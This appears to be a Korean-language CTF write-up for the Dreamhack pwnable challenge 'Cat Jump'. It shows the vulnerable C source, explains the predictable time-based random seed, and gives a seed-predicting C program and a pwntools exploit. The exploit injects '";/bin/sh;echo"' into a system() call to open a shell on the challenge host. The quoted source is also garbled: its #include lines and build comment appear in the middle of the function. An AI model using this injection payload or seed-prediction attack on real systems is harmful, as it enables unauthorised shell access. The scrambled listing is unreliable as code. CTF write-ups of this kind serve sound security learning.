---
title: "Cat Jump 라이트업"
date: 2025-01-03 00:00:00 +0900
categories: [CTF]
tags: [pwnable, writeup]
permalink: /posts/pwn-Cat-Jump/
---
소스 코드가 주어집니다.
```c
#define CAT_JUMP_GOAL 37

#define CATNIP_PROBABILITY 0.1
#define CATNIP_INVINCIBLE_TIMES 3

#define OBSTACLE_PROBABILITY 0.5
#define OBSTACLE_LEFT  0
#define OBSTACLE_RIGHT 1

char cmd_fmt[] = "echo \"%s\" > /tmp/cat_db";

void StartGame() {
    char cat_name[32];
    char catnip;
    char cmd[64];
    char input;
    char obstacle;
    double p;
    unsigned char jump_cnt;

    srand(time(NULL));

    catnip = 0;
    jump_cnt = 0;

    puts("let the cat reach the roof! 🐈");

    sleep(1);

    do {
        // set obstacle with a specific probability.
        obstacle = rand() % 2;

        // get input.
        do {
            printf("left jump='h', right jump='j': ");
            scanf("%c%*c", &input);
        } while (input != 'h' && input != 'l');

        // jump.
        if (catnip) {
            catnip--;
            jump_cnt++;
            puts("the cat powered up and is invincible! nothing cannot stop! 🐈");
        } else if ((input == 'h' && obstacle != OBSTACLE_LEFT) ||
                (input == 'l' && obstacle != OBSTACLE_RIGHT)) {
            jump_cnt++;
            puts("the cat jumped successfully! 🐱");
        } else {
            puts("the cat got stuck by obstacle! 😿 🪨 ");
            return;
        }

        // eat some catnip with a specific probability.
        p = (double)rand() / RAND_MAX;
        if (p < CATNIP_PROBABILITY) {
            puts("the cat found and ate some catnip! 😽");
            catnip = CATNIP_INVINCIBLE_TIMES;
        }
    } while (jump_cnt < CAT_JUMP_GOAL);

    puts("your cat has reached the roof!\n");

    printf("let people know your cat's name 😼: ");
    scanf("%31s", cat_name);/* cat_jump.c
 * gcc -Wall -no-pie -fno-stack-protector cat_jump.c -o cat_jump
*/

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>


    snprintf(cmd, sizeof(cmd), cmd_fmt, cat_name);
    system(cmd);

    printf("goodjob! ");
    system("cat /tmp/cat_db");
}
```

# 공격 기법
```
srand(time(NULL));
```
이 부분이 취약점입니다. 시드를 쉽게 추측하여 난수 시퀀스를 얻을 수 있습니다. <br>

같은 시드(현재 시간)를 기반으로 난수 시퀀스를 계산하는 서브프로세스를 만들었습니다. <br>
```c
#define CAT_JUMP_GOAL 37
#define CATNIP_PROBABILITY 0.1
#define CATNIP_INVINCIBLE_TIMES 3
#define OBSTACLE_LEFT  0
#define OBSTACLE_RIGHT 1

int main() {
    time_t current_time = time(NULL);
    int catnip_active = 0;
    srand(current_time);
    
    for (int i = 0; i < CAT_JUMP_GOAL; i++) {
        int obstacle = rand() % 2;
        
        if (catnip_active > 0) {
            printf("h");
            catnip_active--;
        } else {
            if (obstacle == OBSTACLE_LEFT) {
                printf("l");
            } else {
                printf("h");
            }
        }
        
        double p = (double)rand() / RAND_MAX;
        if (p < CATNIP_PROBABILITY) {
            catnip_active = CATNIP_INVINCIBLE_TIMES;
        }
    }
    printf("\n");
    
    return 0;
}
```

이 C 코드는 서버의 계산을 정확히 시뮬레이션하여 올바른 시퀀스를 만듭니다. 이것을 서브프로세스로 사용할 수 있습니다. <br>

37번 성공한 후, 커맨드 인젝션을 사용할 수 있습니다 (명령어에 공백을 포함하지 마세요)

# 익스플로잇
```py
from pwn import *
import subprocess
import time

def get_sequence():
    result = subprocess.run(['./exploit'], capture_output=True, text=True)
    output_lines = result.stdout.strip().split('\n')
    sequence = output_lines[-1]
    return sequence

host = 'host3.dreamhack.games'
port = 13531

p = remote(host, port)

sequence = get_sequence()
log.info(f"{sequence}")

p.recvuntil("let the cat reach the roof! 🐈")

for i, char in enumerate(sequence):
    p.recvuntil("left jump='h', right jump='j': ")
    p.sendline(char)
    response = p.recvline()
    log.info(f"Turn {i+1}: '{char}' sent, Response: {response.decode().strip()}")

p.recvuntil("let people know your cat's name 😼: ")

shell_command = "\";/bin/sh;echo\""
p.sendline(shell_command)
p.interactive()

```